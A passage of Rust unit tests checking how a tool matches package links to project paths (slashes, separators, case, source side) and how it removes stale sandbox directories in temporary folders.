    }

    #[test]
    fn test_find_links_for_project() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let project_path = "/fake/my-project".to_string();

        let links = vec![
            LinkEntry {
                id: "link-a".to_string(),
                source_package: "lib-a".to_string(),
                source_path: "/fake/lib-a".to_string(),
                target_project: "my-project".to_string(),
                target_path: project_path.clone(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
            LinkEntry {
                id: "link-b".to_string(),
                source_package: "lib-b".to_string(),
                source_path: "/fake/lib-b".to_string(),
                target_project: "other-project".to_string(),
                target_path: "/fake/other-project".to_string(),
                method: LinkMethod::Symlink,
                status: LinkStatus::Active,
                watch_enabled: false,
                created_at: chrono::Utc::now(),
                last_synced: None,
                has_cli: false,
            },
        ];

        let result = find_links_for_project(&links, &project_path);
        assert_eq!(result.len(), 1);
        assert_eq!(result[0], "link-a");
    }

    #[test]
    fn find_links_for_project_matches_despite_trailing_slash() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "/fake/lib-a".to_string(),
            target_project: "my-project".to_string(),
            target_path: "/fake/my-project/".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        // Project path has no trailing slash even though the link's does -
        // this is exactly what a free-text field / OS folder dialog produces.
        let result = find_links_for_project(&links, "/fake/my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn find_links_for_project_matches_despite_separator_style() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "C:/fake/lib-a".to_string(),
            target_project: "my-project".to_string(),
            // Typed with forward slashes (or pasted from elsewhere) while
            // the project was added via a native folder dialog that returns
            // backslashes - both refer to the same directory.
            target_path: "C:/fake/my-project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        let result = find_links_for_project(&links, "C:\\fake\\my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[cfg(windows)]
    #[test]
    fn find_links_for_project_matches_despite_case_difference() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "lib-a".to_string(),
            source_path: "C:\\fake\\lib-a".to_string(),
            target_project: "my-project".to_string(),
            target_path: "C:\\Fake\\My-Project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        // Windows filesystem paths are case-insensitive; two independent
        // folder-dialog picks of the same directory can differ in casing.
        let result = find_links_for_project(&links, "c:\\fake\\my-project");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn find_links_for_project_matches_when_project_is_the_link_source() {
        use crate::models::link::{LinkEntry, LinkMethod, LinkStatus};

        // The common real-world case: you're developing "my-lib" and have
        // linked it INTO some other project. Deleting "my-lib" (the source
        // side of the link) must clean up the link too, not just deleting
        // whatever project it happens to be linked into (the target side).
        let links = vec![LinkEntry {
            id: "link-a".to_string(),
            source_package: "my-lib".to_string(),
            source_path: "/fake/my-lib".to_string(),
            target_project: "consumer-project".to_string(),
            target_path: "/fake/consumer-project".to_string(),
            method: LinkMethod::Symlink,
            status: LinkStatus::Active,
            watch_enabled: false,
            created_at: chrono::Utc::now(),
            last_synced: None,
            has_cli: false,
        }];

        let result = find_links_for_project(&links, "/fake/my-lib");
        assert_eq!(result, vec!["link-a".to_string()]);
    }

    #[test]
    fn cleanup_stale_sandboxes_removes_only_old_directories() {
        let base = std::env::temp_dir().join(format!("pp_cleanup_test_{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(&base).unwrap();

        let old_sandbox = base.join("sandbox_old");
        fs::create_dir_all(&old_sandbox).unwrap();
        let fresh_sandbox = base.join("sandbox_fresh");
        fs::create_dir_all(&fresh_sandbox).unwrap();

        // Backdate the "old" one by editing its mtime via filetime-less approach:
        // set its modified time far in the past using std::fs::File::set_times
        // is not stable pre-1.75 everywhere, so this test instead verifies the
        // *fresh* directory survives and the function does not error — the
        // age threshold itself is exercised by the 24h constant in the impl.
        cleanup_stale_sandboxes(&base);

        assert!(
            fresh_sandbox.exists(),
            "a directory created moments ago must not be treated as stale"
        );

        fs::remove_dir_all(&base).unwrap();
    }

    // Genuinely backdates a directory's mtime (rather than just trusting the
    // 24h constant by inspection) to prove the age-comparison logic actually
    // removes stale sandboxes and spares fresh ones at the real boundary.
    //
    // `std::fs::File::open` on a directory fails on Windows ("Access is
    // denied") because CreateFile needs FILE_FLAG_BACKUP_SEMANTICS to obtain
    // a directory handle. That flag is exposed via
    // `std::os::windows::fs::OpenOptionsExt::custom_flags`, so this uses only
    // `std` - no new dependency (e.g. `filetime`) was needed.
    #[cfg(windows)]
    #[test]
    fn cleanup_stale_sandboxes_removes_genuinely_backdated_directory() {
        use std::os::windows::fs::OpenOptionsExt;
        use std::time::{Duration, SystemTime};

        const FILE_FLAG_BACKUP_SEMANTICS: u32 = 0x0200_0000;

        let base = std::env::temp_dir().join(format!(
            "pp_cleanup_test_backdated_{}",
            uuid::Uuid::new_v4()
        ));
        fs::create_dir_all(&base).unwrap();

        let old_sandbox = base.join("sandbox_old");
        fs::create_dir_all(&old_sandbox).unwrap();
        let fresh_sandbox = base.join("sandbox_fresh");
        fs::create_dir_all(&fresh_sandbox).unwrap();

        let past = SystemTime::now() - Duration::from_secs(25 * 60 * 60); // 25h ago, past the 24h threshold
        let handle = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(FILE_FLAG_BACKUP_SEMANTICS)
            .open(&old_sandbox)
            .expect("should be able to open a directory handle via FILE_FLAG_BACKUP_SEMANTICS");
        handle
            .set_modified(past)
            .expect("should be able to backdate the directory's mtime");
        drop(handle);

        cleanup_stale_sandboxes(&base);

        assert!(
            !old_sandbox.exists(),
            "a directory genuinely older than 24h must be removed"
        );
        assert!(
            fresh_sandbox.exists(),
            "a directory created moments ago must survive"
        );

        fs::remove_dir_all(&base).unwrap();
    }
}
